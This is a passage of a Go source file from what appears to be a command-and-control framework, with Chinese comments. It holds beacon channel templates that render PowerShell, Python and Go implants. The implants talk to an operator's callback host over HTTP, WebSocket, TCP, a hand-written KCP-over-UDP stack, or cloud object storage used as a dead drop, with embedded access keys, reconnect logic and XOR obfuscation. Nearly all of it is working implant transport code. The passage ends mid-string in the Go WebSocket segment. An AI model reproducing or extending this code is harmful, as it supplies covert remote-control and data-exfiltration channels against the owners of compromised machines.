package c2center

// beacon 模板的按载体信道段(三期 §18,Agent T)。
//
// 结构:每种格式的模板(ps1/py/gosrc)只保留传输无关的骨架(信封原语 + 主机档案
// + 任务循环),信道实现按监听器协议渲染进 __<FMT>_CHANNEL__ 占位:
//   http:与一期逐字节等价(body = base64(密文));
//   ws  :文本消息 = base64(密文)(py 手写握手 stdlib;gosrc 手写握手 stdlib;
//         ps1 走 System.Net.WebSockets.ClientWebSocket);
//   tcp :4 字节 big-endian 长度 + 裸密文;
//   kcp :同 tcp 帧格式,承载在纯 Python KCP(py)/ kcp-go(gosrc)上,双端 stream 模式;
//   oss :对象即帧——PUT <prefix>/<uid>/req/<nc>,轮询 GET <prefix>/<uid>/resp/<nc>,
//         读毕删 resp;V1 HMAC-SHA1 手写签名。
//
// 锚点变量(渲染期注入):__CALLBACK__ __URL_PATH__ __B64KEY__ __LISTENER_ID__ 以及
// oss 的 __OSS_EP__/__OSS_BUCKET__/__OSS_AK__/__OSS_SK__/__OSS_PREFIX__/__OSS_SCHEME__
// 和 kcp 的 __KCP_PSK__。
//
// 纯 Python KCP 段移植自开源 ikcp(kcp-python 同源算法;BSD,原版 github.com/skywind3000/kcp),
// 仅标准库,与平台侧 kcp-go(v5)默认参数互通:24 字节小端段头、MTU 1400(mss 1376)、
// 双端 stream 模式(帧协议自带长度前缀,不依赖 KCP 消息边界)。

import (
	"errors"
	"fmt"
	"strings"
)

// transportMatrixError 是「格式 × 协议组合不支持」的明确错误(§18 冻结矩阵:
// kcp 仅 py/gosrc,ps1/bash 不支持)。
func transportMatrixError(format, proto string) error {
	return fmt.Errorf("载荷格式 %s 不支持协议 %s(§18 矩阵:kcp 仅 py/gosrc)", format, proto)
}

// validateFormatForProto 载荷格式 × 监听器协议支持矩阵(§18 freeze):
//
//	http/ws/tcp/oss:ps1/bash/py/gosrc 全支持;kcp:仅 py/gosrc。
func validateFormatForProto(format, proto string) error {
	switch proto {
	case ProtoHTTP, ProtoWS, ProtoTCP, ProtoOSS, "":
		return nil
	case ProtoKCP:
		if format == "ps1" || format == "bash" {
			return transportMatrixError(format, proto)
		}
		return nil
	default:
		return fmt.Errorf("不支持的监听器协议: %s", proto)
	}
}

// transportConfigFor 渲染前解析监听器传输配置(oss 必须齐备;kcp 只取 psk)。
func transportConfigFor(l *Listener) (*TransportConfig, error) {
	cfg, err := parseTransportConfig([]byte(l.TransportConfigJSON))
	if err != nil {
		return nil, err
	}
	if l.Proto == ProtoOSS {
		if strings.TrimSpace(cfg.Endpoint) == "" || strings.TrimSpace(cfg.Bucket) == "" ||
			strings.TrimSpace(cfg.AccessKey) == "" || strings.TrimSpace(cfg.SecretKey) == "" {
			return nil, errors.New("oss 监听器缺少传输配置(endpoint/bucket/access_key/secret_key),请先在监听器上填写")
		}
	}
	return cfg, nil
}

// transportVars 组装各信道段的占位值(esc 按格式选字面量转义:ps1 用 psStr,
// py/gosrc 用 goStr/JSON)。
func transportVars(esc func(string) string, proto string, cfg *TransportConfig, urlPath string) map[string]string {
	m := map[string]string{
		"__KCP_PSK__": esc(""),
	}
	if cfg != nil {
		m["__KCP_PSK__"] = esc(cfg.PSK)
		m["__OSS_EP__"] = esc(cfg.Endpoint)
		m["__OSS_BUCKET__"] = esc(cfg.Bucket)
		m["__OSS_AK__"] = esc(cfg.AccessKey)
		m["__OSS_SK__"] = esc(cfg.SecretKey)
		m["__OSS_PREFIX__"] = esc(cfg.ossPrefix(urlPath))
	}
	return m
}

// ---- python 信道段(bash 版内嵌同一份 py 实现)----

// pyChanHTTP 与一期渲染产物逐字节等价(body = base64(sealed))。
const pyChanHTTP = `_URL = _base + ("/" + _mid if _mid else "") + "/e"

def call(t, d=None, sid=None):
    env = {"t": t, "ts": int(time.time()), "nc": str(uuid.uuid4())}
    if sid:
        env["sid"] = sid
    if d is not None:
        env["d"] = d
    req = urllib.request.Request(
        _URL, data=base64.b64encode(seal_raw(env)).decode("ascii"), method="POST",
        headers={"User-Agent": UA, "Content-Type": "application/octet-stream"})
    with urllib.request.urlopen(req, timeout=40) as resp:
        return open_raw(base64.b64decode(resp.read().decode("ascii")))
`

// pyChanTCP 4B big-endian 长度 + 裸密文;连接保持复用,断线重连后整帧重发
// (信封 nc 每次重建,重试不触防重放)。
const pyChanTCP = `import struct as _struct

_tcp = {"sock": None}

def _tcp_host_port():
    hp = _base.split("://", 1)[-1].split("/", 1)[0]
    host, _, port = hp.partition(":")
    return host, int(port or 80)

def _tcp_connect():
    host, port = _tcp_host_port()
    s = socket.create_connection((host, port), timeout=40)
    _tcp["sock"] = s

def _tcp_readn(s, n):
    buf = b""
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk:
            raise IOError("tcp closed")
        buf += chunk
    return buf

def call(t, d=None, sid=None):
    last = None
    for attempt in (0, 1):
        env = {"t": t, "ts": int(time.time()), "nc": str(uuid.uuid4())}
        if sid:
            env["sid"] = sid
        if d is not None:
            env["d"] = d
        try:
            if _tcp["sock"] is None:
                _tcp_connect()
            sealed = seal_raw(env)
            _tcp["sock"].sendall(_struct.pack(">I", len(sealed)) + sealed)
            ln = _struct.unpack(">I", _tcp_readn(_tcp["sock"], 4))[0]
            if ln <= 0 or ln > 8388608:
                raise IOError("bad frame len %d" % ln)
            return open_raw(_tcp_readn(_tcp["sock"], ln))
        except Exception as exc:
            last = exc
            try:
                if _tcp["sock"] is not None:
                    _tcp["sock"].close()
            except Exception:
                pass
            _tcp["sock"] = None
            if attempt:
                raise
    raise last
`

// pyChanWS 手写握手(stdlib):文本帧 = base64(密文);自动回 pong 保活。
const pyChanWS = `import struct as _struct

GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
_ws = {"sock": None, "buf": bytearray()}

def _ws_host_port():
    hp = _base.split("://", 1)[-1].split("/", 1)[0]
    host, _, port = hp.partition(":")
    return host, int(port or 80)

def _ws_connect():
    host, port = _ws_host_port()
    path = "/" + _mid + "/e" if _mid else "/e"
    s = socket.create_connection((host, port), timeout=40)
    key = base64.b64encode(os.urandom(16)).decode("ascii")
    req = ("GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
           "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\nUser-Agent: %s\r\n\r\n"
           % (path, host, port, key, UA))
    s.sendall(req.encode("ascii"))
    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = s.recv(4096)
        if not chunk:
            raise IOError("ws handshake failed")
        resp += chunk
    head, _, rest = resp.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    if b" 101 " not in lines[0]:
        raise IOError("ws handshake rejected")
    accept = base64.b64encode(hashlib.sha1((key + GUID).encode("ascii")).digest()).decode("ascii")
    # 注意:header 名大小写不敏感,但 base64 值大小写敏感——不能对整块 lower() 后子串匹配
    # (会把真实 accept 值也变小写,永远 mismatch;2026-09-26 三期冒烟实测)。
    accept_line = [ln for ln in head.split(b"\r\n") if ln.lower().startswith(b"sec-websocket-accept:")]
    if not accept_line or accept_line[0].split(b":", 1)[1].strip() != accept.encode("ascii"):
        raise IOError("ws accept mismatch")
    _ws["sock"] = s
    _ws["buf"] = bytearray(rest)

def _ws_read(n):
    buf = _ws["buf"]
    while len(buf) < n:
        chunk = _ws["sock"].recv(65536)
        if not chunk:
            raise IOError("ws closed")
        buf += chunk
    out = bytes(buf[:n])
    del buf[:n]
    return out

def _ws_send(op, payload):
    mask = os.urandom(4)
    hdr = bytearray([0x80 | op])
    n = len(payload)
    if n < 126:
        hdr.append(0x80 | n)
    elif n < 65536:
        hdr.append(0x80 | 126)
        hdr += _struct.pack(">H", n)
    else:
        hdr.append(0x80 | 127)
        hdr += _struct.pack(">Q", n)
    hdr += mask
    body = bytearray(payload[i] ^ mask[i & 3] for i in range(n))
    _ws["sock"].sendall(bytes(hdr + body))

def _ws_recv():
    # 返回一条数据帧(payload);ping 自动回 pong,pong/close/分片在循环内消化。
    fin = 0
    payload = b""
    while True:
        h = _ws_read(2)
        opcode = h[0] & 0x0F
        fin = h[0] & 0x80
        ln = h[1] & 0x7F          # 服务端帧不掩码
        if ln == 126:
            ln = _struct.unpack(">H", _ws_read(2))[0]
        elif ln == 127:
            ln = _struct.unpack(">Q", _ws_read(8))[0]
        data = _ws_read(ln) if ln else b""
        if opcode == 0x9:          # ping → pong
            _ws_send(0xA, data)
            continue
        if opcode == 0xA:          # pong
            continue
        if opcode == 0x8:          # close
            raise IOError("ws closed by peer")
        payload += data
        if fin:
            return payload

def call(t, d=None, sid=None):
    last = None
    for attempt in (0, 1):
        env = {"t": t, "ts": int(time.time()), "nc": str(uuid.uuid4())}
        if sid:
            env["sid"] = sid
        if d is not None:
            env["d"] = d
        try:
            if _ws["sock"] is None:
                _ws_connect()
            _ws_send(0x1, base64.b64encode(seal_raw(env)).decode("ascii").encode("ascii"))
            return open_raw(base64.b64decode(_ws_recv()))
        except Exception as exc:
            last = exc
            try:
                if _ws["sock"] is not None:
                    _ws["sock"].close()
            except Exception:
                pass
            _ws["sock"] = None
            if attempt:
                raise
    raise last
`

// pyChanKCP 纯 Python KCP(移植 ikcp 核心)承载同款帧;双端 stream 模式。
// 可选 psk:对每个 UDP 数据报做循环 XOR(与平台侧对称)。
const pyChanKCP = `import struct as _struct

_KCP_PSK = __KCP_PSK__.encode("utf-8")

def _xor(buf, off):
    # 帧级循环 XOR:off 是该帧内的偏移(含 4B 长度头),逐帧复位;与平台侧对称。
    if not _KCP_PSK:
        return buf
    k = _KCP_PSK
    return bytes(b ^ k[(off + i) % len(k)] for i, b in enumerate(buf))

# ---- 纯 Python KCP(移植开源 ikcp;BSD;仅 stream 模式所需子集) ----

class KCP(object):
    PUSH, ACK, WASK, WINS = 81, 82, 83, 84

    def __init__(self, conv, sock, addr, interval=20):
        self.conv = conv
        self.sock, self.addr, self.interval = sock, addr, interval
        self.mss = 1400 - 24
        self.snd_una = self.snd_nxt = self.rcv_nxt = 0
        self.snd_queue = []      # 待发的 mss 块(stream 模式,无消息边界)
        self.snd_buf = []        # 已发出未确认 {sn,ts,xmit,rto,resendts,fastack,data}
        self.rcv_buf = {}        # sn -> bytes(乱序暂存)
        self.rx = bytearray()    # 顺序到达字节流(供上层按帧解析)
        self.acks = []           # [(sn, ts)]
        self.rmt_wnd = 32
        self.cwnd = 1
        self.ssthresh = 32
        self.rx_srtt = 0
        self.rx_rttval = 0
        self.rto = 200
        self.ts_flush = 0
        self.probe = 0
        self.ts_probe = 0
        self.updated = False

    def _now(self):
        return int(time.time() * 1000) & 0x7fffffff

    def send(self, data):
        for i in range(0, len(data), self.mss):
            self.snd_queue.append(bytes(data[i:i + self.mss]))

    def _peekwnd(self):
        return max(0, 32 - len(self.rcv_buf))

    def _emit(self, cmd, sn=0, ts=0, frg=0, data=b""):
        # 真实 KCP 段头 = 24 字节,wnd 是 uint16(conv4|cmd1|frg1|wnd2|ts4|sn4|una4|len4)。
        # 曾按 "<IBBIIIII" 打成 26 字节,kcp-go 无法解析(2026-09-26 三期互操作冒烟实测)。
        hdr = _struct.pack("<IBBHIIII", self.conv, cmd, frg, self._peekwnd() & 0xFFFF,
                           self._now(), sn, self.snd_una, len(data))
        self.sock.sendto(hdr + data, self.addr)

    def _update_ack(self, rtt):
        if self.rx_srtt == 0:
            self.rx_srtt = max(rtt, 1)
            self.rx_rttval = rtt // 2
        else:
            delta = abs(rtt - self.rx_srtt)
            self.rx_rttval = (3 * self.rx_rttval + delta) // 4
            self.rx_srtt = (7 * self.rx_srtt + rtt) // 8
            if self.rx_srtt < 1:
                self.rx_srtt = 1
        rto = self.rx_srtt + max(self.interval, 4 * self.rx_rttval)
        self.rto = min(max(rto, 30), 60000)

    def input(self, data):
        now = self._now()
        while len(data) >= 24:
            conv, cmd, frg, wnd, ts, sn, una, ln = _struct.unpack("<IBBHIIII", data[:24])
            if conv != self.conv or len(data) < 24 + ln:
                return
            body = bytes(data[24:24 + ln])
            data = data[24 + ln:]
            self.rmt_wnd = wnd
            if una > self.snd_una and una <= self.snd_nxt:
                while self.snd_buf and self.snd_buf[0]["sn"] < una:
                    self.snd_buf.pop(0)
                self.snd_una = una
            if cmd == self.ACK:
                for i, seg in enumerate(self.snd_buf):
                    if seg["sn"] == sn:
                        self._update_ack(now - seg["ts"] if now >= seg["ts"] else 0)
                        self.snd_buf.pop(i)
                        break
                    if seg["sn"] < sn:
                        seg["fastack"] += 1
            elif cmd == self.PUSH:
                self.acks.append((sn, ts))
                if sn < self.rcv_nxt:
                    pass                     # 重复段:已 ack,丢弃
                elif sn not in self.rcv_buf and sn < self.rcv_nxt + 32:
                    self.rcv_buf[sn] = body
                while self.rcv_nxt in self.rcv_buf:
                    self.rx += self.rcv_buf.pop(self.rcv_nxt)
                    self.rcv_nxt += 1
            elif cmd == self.WASK:
                self.probe |= 2              # 对方要窗口 → 回 WINS
            elif cmd == self.WINS:
                self.probe &= ~1
            # 其余命令忽略

    def _flush(self, now):
        for sn, ts in self.acks:
            self._emit(self.ACK, sn=sn, ts=ts)
        self.acks = []

        window = max(1, min(self.cwnd, self.rmt_wnd))
        while self.snd_queue and self.snd_nxt < self.snd_una + window:
            seg = {"sn": self.snd_nxt, "ts": now, "xmit": 0, "rto": self.rto,
                   "resendts": now, "fastack": 0, "data": self.snd_queue.pop(0)}
            self.snd_buf.append(seg)
            self.snd_nxt += 1

        lost = False
        change = 0
        for seg in self.snd_buf:
            needsend = False
            if seg["xmit"] == 0:
                needsend = True
            elif now >= seg["resendts"]:
                needsend = True
                seg["rto"] += max(seg["rto"], self.interval)
                if seg["xmit"] >= 5:
                    lost = True
            elif seg["fastack"] >= 3:
                needsend = True
                change += 1
            if needsend:
                seg["xmit"] += 1
                seg["ts"] = now
                seg["resendts"] = now + seg["rto"]
                self._emit(self.PUSH, sn=seg["sn"], data=seg["data"])

        if self.rmt_wnd == 0:
            if self.probe == 0:
                self.probe = 1
                self.ts_probe = now
            elif now >= self.ts_probe + max(self.rto, self.interval * 4):
                self._emit(self.WASK)
                self.ts_probe = now
        if self.probe & 2:
            self._emit(self.WINS)
            self.probe &= ~2

        if lost:
            self.ssthresh = max(self.cwnd // 2, 1)
            self.cwnd = 1
        if change:
            self.ssthresh = max(self.cwnd // 2, 1)
            self.cwnd = self.ssthresh + change

    def update(self):
        now = self._now()
        if not self.updated:
            self.updated = True
            self.ts_flush = now
        slip = now - self.ts_flush
        if slip >= self.interval:
            self.ts_flush = now if slip > 10000 else self.ts_flush + self.interval
            self._flush(now)

_kcp = {"kcp": None, "buf": bytearray()}

def _kcp_connect():
    hp = _base.split("://", 1)[-1].split("/", 1)[0]
    host, _, port = hp.partition(":")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.0)
    conv = int.from_bytes(os.urandom(4), "little") | 1
    _kcp["kcp"] = KCP(conv, sock, (host, int(port or 7001)))
    _kcp["buf"] = bytearray()

def _kcp_pump(deadline):
    # 收包→input;驱动 update;直到 deadline(阻塞等待响应的循环芯)。
    k = _kcp["kcp"]
    while time.time() < deadline:
        k.update()
        try:
            data, _ = k.sock.recvfrom(65535)
            if data:
                k.input(data)
        except BlockingIOError:
            pass
        except OSError:
            pass
        time.sleep(0.005)
        if k.snd_buf and k.snd_buf[0]["xmit"] > 30:
            raise IOError("kcp dead link")

def _kcp_readn(n):
    buf = _kcp["buf"]
    deadline = time.time() + 40
    while len(buf) < n:
        _kcp_pump(deadline)
        if time.time() >= deadline and len(buf) < n:
            raise IOError("kcp read timeout")
    out = bytes(buf[:n])
    del buf[:n]
    return out

def _kcp_read_frame():
    hdr = bytearray(_kcp_readn(4))
    hdr = bytearray(_xor(hdr, 0))
    ln = _struct.unpack(">I", bytes(hdr))[0]
    if ln <= 0 or ln > 8388608:
        raise IOError("bad frame len %d" % ln)
    return _xor(bytearray(_kcp_readn(ln)), 4)

def call(t, d=None, sid=None):
    last = None
    for attempt in (0, 1):
        env = {"t": t, "ts": int(time.time()), "nc": str(uuid.uuid4())}
        if sid:
            env["sid"] = sid
        if d is not None:
            env["d"] = d
        try:
            if _kcp["kcp"] is None:
                _kcp_connect()
            sealed = seal_raw(env)
            frame = _struct.pack(">I", len(sealed)) + sealed
            _kcp["kcp"].send(_xor(frame, 0))
            return open_raw(_kcp_read_frame())
        except Exception as exc:
            last = exc
            _kcp["kcp"] = None
            if attempt:
                raise
    raise last
`

// pyChanOSS 对象即帧:PUT req → 轮询 GET resp → 删 resp;V1 HMAC-SHA1 手写签名。
const pyChanOSS = `_OSS_EP = __OSS_EP__
_OSS_BUCKET = __OSS_BUCKET__
_OSS_AK = __OSS_AK__
_OSS_SK = __OSS_SK__
_OSS_PREFIX = __OSS_PREFIX__

def _oss_sign(method, date, resource):
    ss = "\n".join([method, "", "application/octet-stream", date, resource])
    sig = base64.b64encode(hmac.new(_OSS_SK.encode("utf-8"),
                                    ss.encode("utf-8"), hashlib.sha1).digest()).decode("ascii")
    return "OSS " + _OSS_AK + ":" + sig

def _oss_url(key):
    return "https://" + _OSS_BUCKET + "." + _OSS_EP.replace("https://", "").replace("http://", "") + "/" + key

def _oss_op(method, key, body=None, expect=None):
    date = email.utils.formatdate(usegmt=True)
    resource = "/" + _OSS_BUCKET + "/" + key
    req = urllib.request.Request(_oss_url(key), data=body, method=method)
    req.add_header("Date", date)
    req.add_header("Content-Type", "application/octet-stream")
    req.add_header("Authorization", _oss_sign(method, date, resource))
    try:
        with urllib.request.urlopen(req, timeout=40) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        if expect is not None and e.code in expect:
            return e.code, b""
        raise

def _oss_put(key, body):
    _oss_op("PUT", key, body=body)

def _oss_get(key):
    code, data = _oss_op("GET", key, expect=(404,))
    return None if code == 404 else data

def _oss_delete(key):
    _oss_op("DELETE", key, expect=(204, 404))

UID = ""

def call(t, d=None, sid=None):
    env = {"t": t, "ts": int(time.time()), "nc": str(uuid.uuid4())}
    if sid:
        env["sid"] = sid
    if d is not None:
        env["d"] = d
    rid = env["nc"]
    base = _OSS_PREFIX + "/" + UID
    _oss_put(base + "/req/" + rid, seal_raw(env))
    for _ in range(60):
        data = _oss_get(base + "/resp/" + rid)
        if data is not None:
            _oss_delete(base + "/resp/" + rid)
            return open_raw(data)
        time.sleep(1.0)
    raise IOError("oss response timeout")
`

// ---- PowerShell 信道段(字符串字面量经 psStr 转义)----

// ps1ChanHTTP 与一期渲染产物等价(body = base64(sealed),走共享 Seal/Unseal)。
const ps1ChanHTTP = `function Call([string]$t, $d, [string]$sid) {
  $msg = @{ t = $t; ts = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); nc = [guid]::NewGuid().ToString() }
  if ($sid) { $msg.sid = $sid }
  if ($null -ne $d) { $msg.d = $d }
  $body = Seal([Text.Encoding]::UTF8.GetBytes((ConvertTo-Json $msg -Compress -Depth 8)))
  $resp = Invoke-WebRequest -Uri $URL -Method POST -Body $body -UserAgent $UA -ContentType 'application/octet-stream' -UseBasicParsing -TimeoutSec 40
  return (Unseal $resp.Content | ConvertFrom-Json)
}
`

// ps1ChanWS System.Net.WebSockets.ClientWebSocket:文本消息 = base64(密文);
// ping/pong 由 .NET 运行时自动应答。
const ps1ChanWS = `$script:WS = $null

function CBHostPort {
  $hp = ($CB -replace '^[a-zA-Z]+://', '') -split '/' | Select-Object -First 1
  $parts = $hp -split ':'
  return @($parts[0], [int]$parts[1])
}

function WSConnect {
  $a = CBHostPort
  $p = "/e"
  if ($UP) { $p = "/$UP/e" }
  $ws = [System.Net.WebSockets.ClientWebSocket]::new()
  $uri = [Uri]::new("ws://" + $a[0] + ":" + $a[1] + $p)
  $ws.ConnectAsync($uri, [Threading.CancellationToken]::None).GetAwaiter().GetResult()
  $script:WS = $ws
}

function WSSend([string]$text) {
  $bytes = [Text.Encoding]::UTF8.GetBytes($text)
  $seg = [ArraySegment[byte]]::new($bytes)
  $script:WS.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).GetAwaiter().GetResult()
}

function WSRecv {
  $buf = New-Object byte[] 65536
  $ms = New-Object IO.MemoryStream
  while ($true) {
    $seg = [ArraySegment[byte]]::new($buf)
    $r = $script:WS.ReceiveAsync($seg, [Threading.CancellationToken]::None).GetAwaiter().GetResult()
    if ($r.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) { throw 'ws closed' }
    $ms.Write($buf, 0, $r.Count)
    if ($r.EndOfMessage) { break }
  }
  return [Text.Encoding]::UTF8.GetString($ms.ToArray())
}

function Call([string]$t, $d, [string]$sid) {
  for ($i = 0; $i -lt 2; $i++) {
    try {
      $msg = @{ t = $t; ts = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); nc = [guid]::NewGuid().ToString() }
      if ($sid) { $msg.sid = $sid }
      if ($null -ne $d) { $msg.d = $d }
      $body = Seal([Text.Encoding]::UTF8.GetBytes((ConvertTo-Json $msg -Compress -Depth 8)))
      if (-not $script:WS -or $script:WS.State -ne [System.Net.WebSockets.WebSocketState]::Open) { WSConnect }
      WSSend $body
      return (Unseal (WSRecv) | ConvertFrom-Json)
    } catch {
      try { if ($script:WS) { $script:WS.Dispose() } } catch {}
      $script:WS = $null
      if ($i -eq 1) { throw }
    }
  }
}
`

// ps1ChanTCP System.Net.Sockets.TcpClient:4B big-endian 长度 + 裸密文。
const ps1ChanTCP = `$script:TCPC = $null

function CBHostPort {
  $hp = ($CB -replace '^[a-zA-Z]+://', '') -split '/' | Select-Object -First 1
  $parts = $hp -split ':'
  return @($parts[0], [int]$parts[1])
}

function TCPConnect {
  $a = CBHostPort
  $script:TCPC = [Net.Sockets.TcpClient]::new()
  $script:TCPC.Connect($a[0], $a[1])
}

function ReadExact([byte[]]$buf, [int]$n) {
  $st = $script:TCPC.GetStream()
  $off = 0
  while ($off -lt $n) {
    $r = $st.Read($buf, $off, $n - $off)
    if ($r -le 0) { throw 'tcp closed' }
    $off += $r
  }
}

function ReadFrame {
  $h = New-Object byte[] 4
  ReadExact $h 4
  [Array]::Reverse($h)   # big-endian → 本机
  $n = [BitConverter]::ToUInt32($h, 0)
  if ($n -le 0 -or $n -gt 8388608) { throw 'bad frame len' }
  $b = New-Object byte[] $n
  ReadExact $b $n
  return $b
}

function Call([string]$t, $d, [string]$sid) {
  for ($i = 0; $i -lt 2; $i++) {
    try {
      $msg = @{ t = $t; ts = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); nc = [guid]::NewGuid().ToString() }
      if ($sid) { $msg.sid = $sid }
      if ($null -ne $d) { $msg.d = $d }
      $sealed = SealRaw([Text.Encoding]::UTF8.GetBytes((ConvertTo-Json $msg -Compress -Depth 8)))
      if (-not $script:TCPC -or -not $script:TCPC.Connected) { TCPConnect }
      $st = $script:TCPC.GetStream()
      $h = [BitConverter]::GetBytes([uint32]$sealed.Length)
      [Array]::Reverse($h)   # 本机 → big-endian
      $st.Write($h, 0, 4)
      $st.Write($sealed, 0, $sealed.Length)
      return (UnsealRaw (ReadFrame) | ConvertFrom-Json)
    } catch {
      try { if ($script:TCPC) { $script:TCPC.Close() } } catch {}
      $script:TCPC = $null
      if ($i -eq 1) { throw }
    }
  }
}
`

// ps1ChanOSS 手写 V1 HMAC-SHA1 签名 + Invoke-WebRequest;对象即帧。
const ps1ChanOSS = `$AK = __OSS_AK__
$SK = __OSS_SK__
$BUCKET = __OSS_BUCKET__
$EP = (__OSS_EP__ -replace '^[a-zA-Z]+://', '')
$PREFIX = __OSS_PREFIX__
$script:UID = ''

function OssSign([string]$method, [string]$date, [string]$resource) {
  $nl = [char]10
  $ss = $method + $nl + $nl + 'application/octet-stream' + $nl + $date + $nl + $resource
  $h = [System.Security.Cryptography.HMACSHA1]::new([Text.Encoding]::UTF8.GetBytes($SK))
  return "OSS " + $AK + ":" + [Convert]::ToBase64String($h.ComputeHash([Text.Encoding]::UTF8.GetBytes($ss)))
}

function OssOp([string]$method, [string]$key, $body) {
  $date = [DateTime]::UtcNow.ToString('r')
  $headers = @{ Date = $date; Authorization = (OssSign $method $date ('/' + $BUCKET + '/' + $key)) }
  $uri = "https://$BUCKET.$EP/$key"
  try {
    if ($null -eq $body) {
      $resp = Invoke-WebRequest -Uri $uri -Method $method -Headers $headers -ContentType 'application/octet-stream' -UseBasicParsing -TimeoutSec 40
    } else {
      $resp = Invoke-WebRequest -Uri $uri -Method $method -Headers $headers -ContentType 'application/octet-stream' -Body $body -UseBasicParsing -TimeoutSec 40
    }
    return $resp.Content
  } catch {
    $code = 0
    try { $code = [int]$_.Exception.Response.StatusCode } catch {}
    if ($code -eq 404 -or $code -eq 204) { return $null }
    throw
  }
}

function Call([string]$t, $d, [string]$sid) {
  $msg = @{ t = $t; ts = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); nc = [guid]::NewGuid().ToString() }
  if ($sid) { $msg.sid = $sid }
  if ($null -ne $d) { $msg.d = $d }
  $sealed = SealRaw([Text.Encoding]::UTF8.GetBytes((ConvertTo-Json $msg -Compress -Depth 8)))
  $rid = $msg.nc
  $bp = "$PREFIX/$script:UID"
  OssOp 'PUT' "$bp/req/$rid" $sealed | Out-Null
  for ($i = 0; $i -lt 60; $i++) {
    $data = OssOp 'GET' "$bp/resp/$rid" $null
    if ($null -ne $data -and $data -is [byte[]]) { OssOp 'DELETE' "$bp/resp/$rid" $null | Out-Null; return (UnsealRaw $data | ConvertFrom-Json) }
    if ($null -ne $data) { OssOp 'DELETE' "$bp/resp/$rid" $null | Out-Null; return (UnsealRaw ([Text.Encoding]::UTF8.GetBytes([string]$data)) | ConvertFrom-Json) }
    Start-Sleep -Seconds 1
  }
  throw 'oss response timeout'
}
`

// ---- Go 源码信道段(字符串字面量经 goStr/JSON 转义;渲染进 main.go)----

// goChanHTTP 与一期渲染产物等价(body = base64(sealed))。
const goChanHTTP = `func channelURL() string {
	u := strings.TrimSuffix(cbAddr, "/")
	if p := strings.Trim(upPath, "/"); p != "" {
		u += "/" + p
	}
	return u + "/e"
}

func call(t string, d any, sid string) (map[string]any, error) {
	env := map[string]any{"t": t, "ts": time.Now().Unix(), "nc": newNC()}
	if sid != "" {
		env["sid"] = sid
	}
	if d != nil {
		env["d"] = d
	}
	sealed, err := sealRaw(env)
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest(http.MethodPost, channelURL(), bytes.NewReader([]byte(base64.StdEncoding.EncodeToString(sealed))))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", ua)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("http %d", resp.StatusCode)
	}
	wire, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		return nil, err
	}
	return openRaw(wire)
}
`

// goChanTCP net.Dial + 4B big-endian 长度帧;断线整帧重试一次。
const goChanTCP = `func dialAddrRaw() string {
	hp := cbAddr
	for _, p := range []string{"https://", "http://"} {
		hp = strings.TrimPrefix(hp, p)
	}
	if i := strings.Index(hp, "/"); i >= 0 {
		hp = hp[:i]
	}
	return hp
}

func dialChannel() (net.Conn, error) {
	return net.DialTimeout("tcp", dialAddrRaw(), 10*time.Second)
}

func writeFrame(c net.Conn, frame []byte) error {
	hdr := make([]byte, 4, 4+len(frame))
	binary.BigEndian.PutUint32(hdr, uint32(len(frame)))
	_, err := c.Write(append(hdr, frame...))
	return err
}

func readFrame(c net.Conn) ([]byte, error) {
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(c, hdr); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(hdr)
	if n == 0 || n > 8<<20 {
		return nil, errors.New("bad frame len")
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(c, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func call(t string, d any, sid string) (map[string]any, error) {
	var last error
	for attempt := 0; attempt < 2; attempt++ {
		env := map[string]any{"t": t, "ts": time.Now().Unix(), "nc": newNC()}
		if sid != "" {
			env["sid"] = sid
		}
		if d != nil {
			env["d"] = d
		}
		c, err := dialChannel()
		if err != nil {
			return nil, err
		}
		sealed, serr := sealRaw(env)
		if serr != nil {
			_ = c.Close()
			return nil, serr
		}
		if werr := writeFrame(c, sealed); werr == nil {
			resp, rerr := readFrame(c)
			_ = c.Close()
			if rerr == nil {
				return openRaw(resp)
			}
			last = rerr
		} else {
			_ = c.Close()
			last = werr
		}
		if attempt == 0 {
			continue
		}
	}
	return nil, last
}
`

// goChanWS 手写握手(stdlib):文本帧 = base64(密文);自动回 pong 保活。
const goChanWS = `const wsGUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

var (
	wsMu   sync.Mutex
	wsConn net.Conn
	wsBuf  bytes.Buffer
)

func dialAddrRaw() string {
	hp := cbAddr
	for _, p := range []string{"https://", "http://"} {
		hp = strings.TrimPrefix(hp, p)
	}
	if i := strings.Index(hp, "/"); i >= 0 {
		hp = hp[:i]
	}
	return hp
}

func wsHostPort() (string, string) {
	host, port, _ := net.SplitHostPort(dialAddrRaw())
	return host, port
}

func wsPath() string {
	if p := strings.Trim(upPath, "/"); p != "" {
		return "/" + p + "/e"
	}
	return "/e"
}

func wsConnect() error {
	host, port := wsHostPort()
	c, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 10*time.Second)
	if err != nil {
		return err
	}
	mask := make([]byte, 16)
	_, _ = crand.Read(mask)
	key := base64.StdEncoding.EncodeToString(mask)
	req := "GET " + wsPath() + " HTTP/1.1\r\n" +
		"Host: " + net.JoinHostPort(host, port) + "\r\n" +
